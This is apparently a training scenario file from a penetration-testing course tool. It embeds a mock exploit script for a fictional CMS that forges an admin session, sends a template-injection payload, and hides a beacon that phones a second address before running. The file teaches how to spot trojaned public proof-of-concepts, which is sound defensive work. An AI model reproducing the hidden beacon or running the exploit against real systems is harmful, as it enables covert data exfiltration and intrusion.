"""salvage defect class 10, and the capstone of the track (crux D19).

Every other scenario here is about making somebody else code work. This one is
about the moment before that: you downloaded a script from a stranger and you
are about to run it with your own privileges, on your own machine, on an
engagement.

**This is the only scenario in crux you can fail by pressing a key.** The
proof-of-concept contacts an address written into it before it touches the
target at all. crux owns that address, so nothing leaves the machine and the
beacon carries a fixed marker rather than anything of yours. On a real
engagement neither of those would be true, and that is the whole lesson.

Everyone is warned about this and almost nobody is ever tested on it. crux
can test it, because it is the thing on the other end of the socket.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# Wexler CMS 2.1 - admin session forge -> template import RCE
# mirror build v3 - original author unreachable, reuploaded by request
import base64
import urllib.parse
import urllib.request
import urllib.error

TARGET = "{{URL}}"
FEED = "{{SINK}}"

SESSION = "wx-admin-4c1f9a"
PAYLOAD = "{{tpl.render('id')}}"


def _feed_check():
    """Check the exploit feed for a newer build of this script."""
    try:
        tag = base64.b64encode(b"wexler-2.1-mirror-v3").decode()
        d = urllib.parse.urlencode({"build": tag, "run": "1"}).encode()
        urllib.request.urlopen(urllib.request.Request(FEED + "/feed", d),
                               timeout=3)
    except Exception:
        pass


def forge():
    return {"session": SESSION, "template": PAYLOAD, "name": "report"}


def main():
    _feed_check()
    print("[*] forging admin session " + SESSION)
    data = urllib.parse.urlencode(forge()).encode()
    req = urllib.request.Request(TARGET + "/admin/import", data)
    try:
        body = urllib.request.urlopen(req).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    print("[*] response: " + body)
    print("[+] landed" if "CRUX-LANDED" in body else "[-] no")


if __name__ == "__main__":
    main()
'''

SOLUTION = BROKEN.replace('    _feed_check()\n', '')

SCENARIOS = [
    Scenario(
        id='salvage-hostile', track='salvage', tier='verified', order=100,
        title='A mirror build of somebody else exploit',
        waypoint='foothold-attempt', hone=('python',),
        source='PEN-200 Playbook/13 - Third-Party Exam Scripts and Automation.md',
        body=SalvageBody(
            brief='This proof-of-concept forges an admin session and imports '
                  'a template. It came from a mirror; the original author '
                  'page is gone. It is reported to work as-is.',
            filename='wexler_forge.py',
            cve='CVE-2023-35829', models='a trojaned public PoC',
            real_note=(
                'This is not hypothetical: fake PoCs for CVE-2023-35829 and for '
                'the F5 CVE-2022-1388 were published as malware that ran on the '
                "analyst's own box. Read it before you run it."
            ),
            defects=('phones an address of its own before doing anything',),
            route='/admin/import',
            reject_code=400,
            reject_message='session or template missing',
            trap_note='an exploit feed check that runs before the exploit',
            trap=(Requirement('a beacon', 'route', '/feed',
                              hint='the script contacted its own address'),),
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('a forged session', 'form', 'wx-admin-',
                            key='session',
                            hint='no session parameter arrived'),
                Requirement('the import endpoint', 'route', '/admin/import',
                            hint='nothing arrived at /admin/import'),
                Requirement('a template payload', 'form', 'tpl.render',
                            key='template',
                            hint='the template field carried no payload'),
            ),
            debrief='The exploit works. It also calls `_feed_check()` on its '
                    'first line, which posts to an address that is not the '
                    'target, and it does that **before** anything you asked '
                    'for. Here the address belongs to crux and the payload is '
                    'a fixed marker. In the wild that function reads your SSH '
                    'key, your `~/.msf4`, or the contents of the engagement '
                    'directory you ran it from, and the machine on the other '
                    'end is not yours.\n\n'
                    'The tells were all in the file: an import of `base64` '
                    'that the exploit never needs, a second URL constant '
                    'beside `TARGET`, a `try/except Exception: pass` around '
                    'the one call that touches the network quietly, and a '
                    'friendly docstring on the only function that does not '
                    'belong. **Read it before you run it**, and read it for '
                    'what it does besides the thing you wanted.',
        ),
    ),
]
